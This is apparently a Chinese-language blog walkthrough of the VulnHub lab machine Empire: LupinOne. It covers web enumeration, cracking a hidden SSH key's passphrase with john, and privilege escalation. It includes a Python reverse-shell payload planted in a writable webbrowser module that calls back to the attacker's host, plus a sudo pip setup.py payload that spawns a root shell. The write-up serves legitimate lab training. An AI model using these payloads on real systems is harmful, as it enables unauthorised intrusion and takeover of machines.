---
title: VulnHub Empire：LupinOne
date: 2026-05-08 08:20:00
categories: 
  - VulnHub
tags:
  - 弱口令
  - 环境变量劫持
---

# Empire：LupinOne

项目地址：https://download.vulnhub.com/empire/01-Empire-Lupin-One.zip

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/69fd46c74b8701858e74097a.png)

## 弱口令

### SSH

访问 80 端口只有一张图片，查看页面源代码找到注释

![](https://pic1.imgdb.cn/item/69fd478f4b8701858e740aae.png)

访问 `/robots.txt` 拿到线索

![](https://pic1.imgdb.cn/item/69fd47ae4b8701858e740b1d.png)

访问 `/~myfiles` 回显 404，页面源代码有注释

![](https://pic1.imgdb.cn/item/69fd47c04b8701858e740b4c.png)

扫描目录找到一个 `/~secret`，得到如下信息

- 用户名为 icex64

- 存在一个隐藏的 SSH 私钥文件

![](https://pic1.imgdb.cn/item/69fd485f4b8701858e740cb9.png)

继续 FUZZ 这个目录找到 `.mysecret.txt` 文件，看文件内容应该是密钥

![](https://pic1.imgdb.cn/item/69fd48be4b8701858e740d53.png)

AI 识别出了是 Base58 编码，解码拿到私钥

![](https://pic1.imgdb.cn/item/69fd496c4b8701858e740e6e.png)

改为权限结果连不上，系统判定这不是 SSH 私钥文件

![](https://pic1.imgdb.cn/item/69fd4c2c4b8701858e7412ed.png)

使用 ssh2john 转换格式准备爆破

```bash
ssh2john id_rsa > john_id
john john_id --wordlist=/usr/share/wordlists/fasttrack.txt
```

最后爆破出密码为 `P@55w0rd!`

![](https://pic1.imgdb.cn/item/69fd4b404b8701858e74119e.png)

成功连接

![](https://pic1.imgdb.cn/item/69fd4be44b8701858e74129f.png)

## 提权

### 环境变量劫持

检查权限发现我们可以运行一个用户的 Python 程序

![](https://pic1.imgdb.cn/item/69fd4c8c4b8701858e7413a7.png)

查看文件内容，发现导入了一个 `webbrowser`

![](https://pic1.imgdb.cn/item/69fd4cdc4b8701858e741474.png)

在用户家目录中没有发现这个文件，所以大概率就是在 Python 3.9 目录里面

找到后发现权限是其他人可修改

![](https://pic1.imgdb.cn/item/69fd4d164b8701858e7415e7.png)

改源代码为反弹 Shell

```python
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("192.168.110.128",6522))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

![](https://pic1.imgdb.cn/item/69fd4f1b4b8701858e741cfd.png)

成功连上

```bash
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

![](https://pic1.imgdb.cn/item/69fd4faa4b8701858e741ec0.png)

继续检查权限发现可以运行 `pip`

![](https://pic1.imgdb.cn/item/69fd501a4b8701858e741f49.png)

当你执行 `sudo pip install /path/to/directory` 时，pip 会：：

- 1. 将整个目录复制到一个临时构建目录（如 `/tmp/pip-req-build-xxxxx`）

- 2. 切换到该构建目录，执行 `python setup.py egg_info` 命令，生成 `.egg-info` 元数据目录

- 3. 如果 `egg_info` 成功，再执行 `python setup.py install` 进行实际的编译和安装

关键在于第一步：运行 `setup.py egg_info`，本质上就是 `python setup.py egg_info`，会完整执行 `setup.py`

```bash
TF=$(mktemp -d) # 创建临时目录
echo 'import os; os.system("/bin/bash -p")' > $TF/setup.py
echo 'from setuptools import setup; setup(name="shell", version="1.0")' >> $TF/setup.py
sudo pip install $TF
```

![](https://pic1.imgdb.cn/item/69fd527e4b8701858e742336.png)